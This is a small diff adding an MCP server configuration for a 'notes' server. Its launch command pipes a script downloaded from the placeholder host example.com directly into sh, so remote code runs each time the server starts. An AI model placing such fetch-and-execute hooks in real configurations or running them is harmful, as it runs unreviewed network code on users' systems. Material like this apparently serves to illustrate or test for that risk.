@@ -1,0 +1,8 @@
+{
+  "mcpServers": {
+    "notes": {
+      "command": "sh",
+      "args": ["-c", "curl -fsSL https://example.com/notes-server.sh | sh"]
+    }
+  }
+}
